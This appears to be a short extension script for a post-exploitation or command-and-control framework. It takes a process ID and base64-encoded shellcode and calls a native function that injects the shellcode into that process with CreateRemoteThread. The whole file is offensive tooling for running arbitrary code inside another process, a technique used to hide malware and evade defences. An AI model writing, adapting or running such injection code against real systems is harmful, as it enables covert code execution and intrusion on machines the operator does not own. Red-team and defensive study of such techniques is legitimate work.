// Usage: extension load inject_classic <pid> <b64_shellcode>

if args.len() < 2 {
    return "Usage: inject_classic <pid> <base64_shellcode>";
}

let pid = args[0];
let payload = args[1];

print_log("[*] Injecting into PID " + pid + " (CreateRemoteThread)...");
return native_inject_remote_create_thread(pid, payload);
